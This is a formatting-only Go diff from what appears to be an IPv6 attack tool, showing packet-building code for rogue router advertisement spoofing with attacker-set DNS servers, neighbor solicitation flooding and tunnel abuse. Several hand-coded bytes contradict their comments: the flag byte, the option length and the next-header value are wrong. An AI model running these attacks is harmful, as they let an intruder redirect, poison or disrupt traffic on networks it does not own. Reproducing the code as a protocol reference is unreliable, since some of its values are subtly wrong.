@@ -51,20 +51,20 @@ func (e *Engine) RASpoof(prefix string, prefixLen int, dnsServers []string) (*IP
 
 func (e *Engine) buildRAPacket(prefix string, prefixLen int, dnsServers []string) []byte {
 	var buf []byte
-	buf = append(buf, 0x86) // ICMPv6 Router Advertisement
-	buf = append(buf, 0x00) // Code
+	buf = append(buf, 0x86)       // ICMPv6 Router Advertisement
+	buf = append(buf, 0x00)       // Code
 	buf = append(buf, 0x00, 0x00) // Checksum placeholder
 
 	// Hop limit and flags
-	buf = append(buf, 0xff) // Cur hop limit
-	buf = append(buf, 0x40) // M=1, O=1 for stateful config
+	buf = append(buf, 0xff)       // Cur hop limit
+	buf = append(buf, 0x40)       // M=1, O=1 for stateful config
 	buf = append(buf, 0x00, 0x00) // Router lifetime
 
 	// Prefix info option
-	buf = append(buf, 0x03)     // Type: Prefix Info
-	buf = append(buf, 0x04)     // Length (8 bytes)
+	buf = append(buf, 0x03) // Type: Prefix Info
+	buf = append(buf, 0x04) // Length (8 bytes)
 	buf = append(buf, byte(prefixLen))
-	buf = append(buf, 0xc0)    // L=1, A=1
+	buf = append(buf, 0xc0)                   // L=1, A=1
 	buf = append(buf, 0x00, 0x00, 0x00, 0x00) // Valid lifetime
 	buf = append(buf, 0x00, 0x00, 0x00, 0x00) // Preferred lifetime
 
@@ -107,8 +107,8 @@ func (e *Engine) NSFlood(targetIPv6 string, count int) (*IPv6Result, error) {
 
 func (e *Engine) buildNSPacket(target string) []byte {
 	var buf []byte
-	buf = append(buf, 0x87) // ICMPv6 Neighbor Solicitation
-	buf = append(buf, 0x00) // Code
+	buf = append(buf, 0x87)       // ICMPv6 Neighbor Solicitation
+	buf = append(buf, 0x00)       // Code
 	buf = append(buf, 0x00, 0x00) // Checksum
 
 	targetIP := net.ParseIP(target)
@@ -229,12 +229,12 @@ func (e *Engine) TunnelAbuse(tunnelType string, endpoint string) (*IPv6Result, e
 	defer e.mu.Unlock()
 
 	validTypes := map[string]bool{
-		"6to4":      true,
-		"teredo":    true,
-		"isatap":    true,
-		"gretap":    true,
-		"ipip":      true,
-		"sit":       true,
+		"6to4":   true,
+		"teredo": true,
+		"isatap": true,
+		"gretap": true,
+		"ipip":   true,
+		"sit":    true,
 	}
 
 	if !validTypes[tunnelType] {
@@ -279,7 +279,7 @@ func (e *Engine) buildTunnelPacket(info TunnelInfo) []byte {
 	buf = append(buf, protoBytes...)
 
 	buf = append(buf, byte(info.HopLimit))
-	buf = append(buf, 0xff) // Next header: IPv6
+	buf = append(buf, 0xff)       // Next header: IPv6
 	buf = append(buf, 0x00, 0x00) // Payload length placeholder
 
 	return buf
